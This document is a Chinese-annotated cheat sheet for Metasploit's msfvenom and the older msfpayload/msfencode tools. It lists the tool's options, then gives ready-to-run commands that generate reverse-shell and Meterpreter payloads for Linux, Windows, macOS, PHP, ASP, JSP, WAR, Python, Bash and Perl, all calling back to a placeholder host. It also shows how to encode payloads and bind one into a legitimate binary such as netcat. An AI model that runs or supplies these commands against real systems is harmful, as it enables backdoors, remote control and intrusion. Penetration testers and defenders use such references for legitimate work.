
```bash
Options:
    -p, --payload       <payload>    Payload to use. Specify a '-' or stdin to use custom payloads           这个就是以前的msfpayload
        --payload-options            List the payload's standard options
    -l, --list          [type]       List a module type. Options are: payloads, encoders, nops, all          这个可以列出所有的模块的类型
    -n, --nopsled       <length>     Prepend a nopsled of [length] size on to the payload
    -f, --format        <format>     Output format (use --help-formats for a list)
        --help-formats               List available formats
    -e, --encoder       <encoder>    The encoder to use                                                      这个就是msfencode
    -a, --arch          <arch>       The architecture to use
        --platform      <platform>   The platform of the payload
        --help-platforms             List available platforms
    -s, --space         <length>     The maximum size of the resulting payload
        --encoder-space <length>     The maximum size of the encoded payload (defaults to the -s value)
    -b, --bad-chars     <list>       The list of characters to avoid example: '\x00\xff'
    -i, --iterations    <count>      The number of times to encode the payload
    -c, --add-code      <path>       Specify an additional win32 shellcode file to include
    -x, --template      <path>       Specify a custom executable file to use as a template
    -k, --keep                       Preserve the template behavior and inject the payload as a new thread
    -o, --out           <path>       Save the payload
    -v, --var-name      <name>       Specify a custom variable name to use for certain output formats
        --smallest                   Generate the smallest possible payload
```
```bash
Linux
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=5555 -f elf > shell.elf
Windows
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=5555 -f exe > shell.exe
MAC
    msfvenom -p osx/x86/shell_reverse_tcp LHOST=1.1.1.1 LPORT=5555 -f macho > shell.macho
PHP
    msfvenom -p php/meterpreter_reverse_tcp LHOST=1.1.1.1 LPORT=5555 -f raw > shell.php
    cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
ASP
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=5555 -f asp > shell.asp
JSP
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=1.1.1.1 LPORT=5555 -f raw > shell.jsp
WAR   
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=1.1.1.1 LPORT=5555 -f war > shell.war
Python
    msfvenom -p cmd/unix/reverse_python LHOST=1.1.1.1 LPORT=5555 -f raw > shell.py
Bash
    msfvenom -p cmd/unix/reverse_bash LHOST=1.1.1.1 LPORT=5555 -f raw > shell.sh
Perl
    msfvenom -p cmd/unix/reverse_perl LHOST=1.1.1.1 LPORT=5555 -f raw > shell.pl
ShellCode
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=5555 -f <language>
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=5555 -f <language>
    msfvenom -p osx/x86/shell_reverse_tcp LHOST=1.1.1.1 LPORT=5555 -f <language>
```
这里再贴出老版本的msfpayload生成，想对比而言，使用其实是一样的，只不过将原来的命令使用参数来代替；
```bash
Linux
    msfpayload linux/x86/shell_reverse_tcp LHOST=1.1.1.1 LPORT=555 X > payload
jsp
    msfpayload java/jsp_shell_reverse_tcp LHOST=1.1.1.1 LPORT=5555 R > door.jsp
war
    msfpayload linux/x86/shell_reverse_tcp LHOST=1.1.1.1 LPORT=5555 W>door.war  上传成功以后执行：unzip door.war
php
    msfpayload php/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=5555 R | msfencode –e php/base64 –t raw –o payload.php 注：生成的文件需要加上<?php ?>
asp/aspx
    msfpayload windows/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=5555 R |  msfencode –e x86/shikata_ga_nai –a x86 –t asp/aspx –o door.asp/aspx
Windows
    msfpayload windows/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=5555 R |  msfencode –t exe –c 5 > payload.exe
payload与可执行文件绑定
     msfpayload linux/x86/shell_reverse_tcp EXITFUNC=thread LHOST=1.1.1.1 LPORT=5555  R | msfencode –a x86 –e x86/alpha_mixed –k –x /bin/netcat –t elf –o nc

使用-l参数可以查看payload encode等种类
```
---------------------------
要想输出二进制文件都得输出到管道中写入文件中 `>`  ，这样才会执行